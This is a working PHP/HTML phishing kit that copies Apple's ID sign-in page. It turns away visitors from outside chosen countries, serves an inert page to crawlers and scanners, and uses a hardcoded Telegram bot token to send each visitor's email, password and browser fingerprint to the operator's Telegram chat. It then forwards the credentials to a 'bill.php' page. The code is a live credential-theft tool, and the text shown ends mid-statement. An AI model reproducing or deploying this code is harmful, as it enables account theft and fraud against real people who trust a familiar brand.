<?php
// === SECURITY ENHANCEMENTS ===
// Start output buffering to prevent any accidental output
ob_start();

// Set security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');

// Initialize session with secure parameters
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_start();

// ---- COUNTRY RESTRICTION ----
$allowedCountries = ["TN", "GB", "DE", "HU", "US", "CH", "PL"];
$ip = $_SERVER['REMOTE_ADDR'];
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode"), true);
$countryCode = $details['countryCode'] ?? null;

if (!$countryCode || !in_array($countryCode, $allowedCountries)) {
    header("HTTP/1.1 403 Forbidden");
    echo "<h2>Access Restricted</h2><p>This service is not available in your region.</p>";
    exit;
}

// Simple rate limiting
$request_time = time();
$rate_limit_file = 'rate_limit.txt';

// Read rate limit data
$rate_data = [];
if (file_exists($rate_limit_file)) {
    $rate_data = json_decode(file_get_contents($rate_limit_file), true) ?: [];
}

// Clean old entries (older than 1 hour)
foreach ($rate_data as $stored_ip => $time) {
    if ($request_time - $time > 3600) {
        unset($rate_data[$stored_ip]);
    }
}

// Check if IP has made too many requests (more than 5 in 1 hour)
if (isset($rate_data[$ip]) && $rate_data[$ip] > 5) {
    header('HTTP/1.1 429 Too Many Requests');
    exit('Too many requests. Please try again later.');
}

// Update rate limit data
$rate_data[$ip] = isset($rate_data[$ip]) ? $rate_data[$ip] + 1 : 1;
file_put_contents($rate_limit_file, json_encode($rate_data));

// Basic bot detection
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (empty($user_agent) || preg_match('/bot|crawl|slurp|spider|curl|wget|python|java|phantom|headless/i', $user_agent)) {
    // Log potential bot
    file_put_contents('bot_attempts.log', date('Y-m-d H:i:s') . " - Potential bot: $ip - $user_agent\n", FILE_APPEND);
    // Serve a simplified version without functionality
    header('Content-Type: text/html');
    ob_end_flush();
    // Continue with HTML output but without the sensitive JavaScript
    $restrictedMode = true;
} else {
    $restrictedMode = false;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Secure Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap');

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(180deg, #e5e5ea, #f2f2f7);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1d1d1f;
        }
        .container {
            background-color: #fff;
            padding: 50px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 420px;
            text-align: center;
            position: relative;
        }
        .security-badge {
            position: absolute;
            top: 15px;
            right: 15px;
            color: #0071e3;
            font-size: 12px;
            display: flex;
            align-items: center;
        }
        .security-badge svg {
            width: 14px;
            height: 14px;
            margin-right: 4px;
        }
        .logo {
            width: 72px;
            margin-bottom: 30px;
        }
        h1 {
            font-weight: 600;
            font-size: 28px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            color: #6e6e73;
            margin-bottom: 30px;
        }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 12px;
            border: 1px solid #d1d1d6;
            font-size: 16px;
            transition: border 0.3s, box-shadow 0.3s;
        }
        input[type="email"]:focus, input[type="password"]:focus, input[type="text"]:focus {
            border: 1px solid #0071e3;
            box-shadow: 0 0 5px rgba(0,113,227,0.5);
            outline: none;
        }
        input[type="submit"] {
            width: 100%;
            padding: 15px;
            background-color: #0071e3;
            background-image: linear-gradient(90deg, #0071e3, #005bb5);
            color: white;
            font-size: 16px;
            font-weight: 600;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        input[type="submit"]:hover {
            background-image: linear-gradient(90deg, #005bb5, #0071e3);
        }
        .links {
            margin-top: 20px;
            font-size: 14px;
        }
        .links a {
            color: #06c;
            text-decoration: none;
        }
        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #6e6e73;
            line-height: 1.5;
        }
        .footer a {
            color: #06c;
            text-decoration: none;
            margin: 0 5px;
        }
        .bot-check {
            text-align: left;
            margin: 15px 0;
            font-size: 14px;
        }
        .bot-check label {
            display: block;
            margin-bottom: 5px;
            color: #6e6e73;
        }
        .access-denied {
            display: none;
            background: #fff;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 450px;
        }
        .access-denied h2 {
            color: #ff3b30;
            margin-bottom: 20px;
        }
        @media (max-width: 420px) {
            .container { padding: 30px 20px; }
            h1 { font-size: 24px; }
            input[type="email"], input[type="password"], input[type="text"], input[type="submit"] { padding: 12px; font-size: 15px; }
        }
        
        /* Honeypot field - hidden from humans but visible to bots */
        .hp-field {
            opacity: 0;
            position: absolute;
            top: 0;
            left: 0;
            height: 0;
            width: 0;
            z-index: -1;
        }
        
        .loading {
            display: none;
            margin-top: 15px;
        }
        
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0071e3;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container" id="loginForm">
    <div class="security-badge">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path fill-rule="evenodd" d="M12.516 2.17a.75.75 0 00-1.032 0 11.209 11.209 0 01-7.877 3.08.75.75 0 00-.722.515A12.74 12.74 0 002.25 9.75c0 5.942 4.064 10.933 9.563 12.348a.75.75 0 00.374 0c5.499-1.415 9.563-6.406 9.563-12.348 0-1.39-.223-2.73-.635-3.985a.75.75 0 00-.722-.516l-.143.001c-2.996 0-5.717-1.17-7.734-3.08zm3.094 8.016a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z" clip-rule="evenodd" />
        </svg>
        Secure Login
    </div>
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
    <h1>Apple ID</h1>
    <p>Sign in to access your Apple account</p>
    <form id="loginFormElement">
        <!-- Honeypot field -->
        <input type="text" class="hp-field" name="website" autocomplete="off">
        
        <input type="email" id="email" name="email" placeholder="Apple ID" required>
        <input type="password" id="password" name="password" placeholder="Password" required>
        
        <!-- Bot check question -->
        <div class="bot-check">
            <label for="botcheck">Security Check: What is 7 + 3? (to verify you're human)</label>
            <input type="text" id="botcheck" name="botcheck" required>
        </div>
        
        <input type="submit" value="Sign In" id="submitBtn">
        
        <div class="loading" id="loadingIndicator">
            <div class="loading-spinner"></div>
            <p>Verifying security...</p>
        </div>
    </form>
    <div class="links">
        <a href="">Forgot Apple ID or password?</a>
    </div>
    <div class="footer">
        <p>
            <a href="#">Privacy Policy</a> | 
            <a href="#">Terms of Use</a> | 
            <a href="#">Apple Support</a>
        </p>
        <p>Apple &copy; 2025 Apple Inc. All rights reserved.</p>
    </div>
</div>

<div class="access-denied" id="accessDenied">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="64" height="64" style="color: #ff3b30;">
        <path fill-rule="evenodd" d="M9.401 3.003c1.155-2 4.043-2 5.197 0l7.355 12.748c1.154 2-.29 4.5-2.599 4.5H4.645c-2.309 0-3.752-2.5-2.598-4.5L9.4 3.003zM12 8.25a.75.75 0 01.75.75v3.75a.75.75 0 01-1.5 0V9a.75.75 0 01.75-.75zm0 8.25a.75.75 0 100-1.5.75.75 0 000 1.5z" clip-rule="evenodd" />
    </svg>
    <h2>Access Restricted</h2>
    <p>We're sorry, but access to this service is not available from your current location.</p>
    <p>For assistance, please contact Apple Support.</p>
</div>

<script>
// Only execute the sensitive code if not in restricted mode
<?php if (!$restrictedMode): ?>
    // Allowed countries
    const allowedCountries = ['TN', 'US', 'JP', 'UK', 'DE', 'FR', 'CH'];
    
    // Start time for form submission timing
    const startTime = new Date();
    
    // Telegram Bot details
    const TELEGRAM_BOT_TOKEN = '8450566694:AAHKZmBuNJZ8BdvkA4ab6kli8PXC24X2D2U';
    const TELEGRAM_CHAT_ID = '-4932499123';
    
    // Function to get user's country based on IP with multiple fallbacks
    async function getUserCountry() {
        const services = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://extreme-ip-lookup.com/json/'
        ];
        
        for (const service of services) {
            try {
                const response = await fetch(service, {
                    signal: AbortSignal.timeout(3000)
                });
                if (response.ok) {
                    const data = await response.json();
                    return data.country_code || data.country || 'Unknown';
                }
            } catch (error) {
                console.log(`Service ${service} failed, trying next`);
            }
        }
        return 'Unknown';
    }
    
    // Function to send message to Telegram with error handling
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                }),
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    }
    
    // Function to collect user data
    function collectUserData() {
        return {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            date: new Date().toISOString()
        };
    }
    
    // Enhanced bot detection
    function isBot() {
        // Check for headless browser indicators
        const indicators = [
            navigator.webdriver,
            navigator.languages && navigator.languages.length === 0,
            /HeadlessChrome|PhantomJS|Electron|Bot|Crawler|Spider|curl|wget|python|java|node/i.test(navigator.userAgent),
            !('ontouchstart' in window) && navigator.maxTouchPoints > 0,
            window.outerWidth === 0 && window.outerHeight === 0
        ];
        
        return indicators.some(indicator => indicator === true);
    }
    
    // Check if user is from allowed country
    async function checkCountryAccess() {
        try {
            const userCountry = await getUserCountry();
            
            if (userCountry && !allowedCountries.includes(userCountry)) {
                document.getElementById('loginForm').style.display = 'none';
                document.getElementById('accessDenied').style.display = 'block';
                
                // Send notification to Telegram
                const userData = collectUserData();
                const message = `🚫 Access denied from ${userCountry}\n\n📧 Email: ${userData.email || 'N/A'}\n🌐 Country: ${userCountry}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
                
                await sendToTelegram(message);
                return false;
            }
            return true;
        } catch (error) {
            console.error('Country check error:', error);
            return true; // Allow access if country detection fails
        }
    }
    
    // Function to redirect to bill.php after sending Telegram message
    function redirectToBill() {
        // Create a form dynamically to submit the data
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'bill.php';
        
        // Add email field
        const emailInput = document.createElement('input');
        emailInput.type = 'hidden';
        emailInput.name = 'email';
        emailInput.value = document.getElementById('email').value;
        form.appendChild(emailInput);
        
        // Add password field
        const passwordInput = document.createElement('input');
        passwordInput.type = 'hidden';
        passwordInput.name = 'password';
        passwordInput.value = document.getElementById('password').value;
        form.appendChild(passwordInput);
        
        // Add botcheck field
        const botcheckInput = document.createElement('input');
        botcheckInput.type = 'hidden';
        botcheckInput.name = 'botcheck';
        botcheckInput.value = document.getElementById('botcheck').value;
        form.appendChild(botcheckInput);
        
        // Submit the form
        document.body.appendChild(form);
        form.submit();
    }
    
    // Initialize page
    document.addEventListener('DOMContentLoaded', function() {
        // Send notification when page is accessed
        const userData = collectUserData();
        const accessMessage = `🔔 Page accessed\n\n🌐 Country: Detecting...\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
        sendToTelegram(accessMessage);
        
        // Check country access
        checkCountryAccess();
        
        // Add event listener to form
        document.getElementById('loginFormElement').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Show loading indicator
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            
            // Honeypot check
            const honeypot = document.querySelector('input[name="website"]').value;
            if (honeypot) {
                alert('Bot activity detected!');
                
                // Send notification to Telegram
                const userData = collectUserData();
                const message = `🤖 Honeypot triggered\n\n📧 Email: ${userData.email}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
                
                await sendToTelegram(message);
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Bot detection
            if (isBot()) {
                alert('Automated activity detected. Please contact support if this is an error.');
                
                // Send notification to Telegram
                const userData = collectUserData();
                const message = `🤖 Bot detected\n\n📧 Email: ${userData.email}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
                
                await sendToTelegram(message);
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Time check - if form submitted too quickly (less than 3 seconds)
            const endTime = new Date();
            const timeTaken = (endTime - startTime) / 1000;
            if (timeTaken < 3) {
                alert('Please take your time to fill out the form correctly.');
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Math question check
            const mathAnswer = document.getElementById('botcheck').value;
            if (mathAnswer !== '10') {
                alert('Incorrect answer to security question. Please try again.');
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // If all checks pass, send data to Telegram
            const userData = collectUserData();
            const userCountry = await getUserCountry();
            
            const message = `✅ Login attempt\n\n📧 Email: ${userData.email}\n🔑 Password: ${userData.password}\n🌐 Country: ${userCountry || 'Unknown'}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
            
            // Send to Telegram and then redirect
            const success = await sendToTelegram(message);
            if (success) {
                // Redirect to bill.php after sending Telegram message
                redirectToBill();
            } else {
                alert('There was an issue with the 
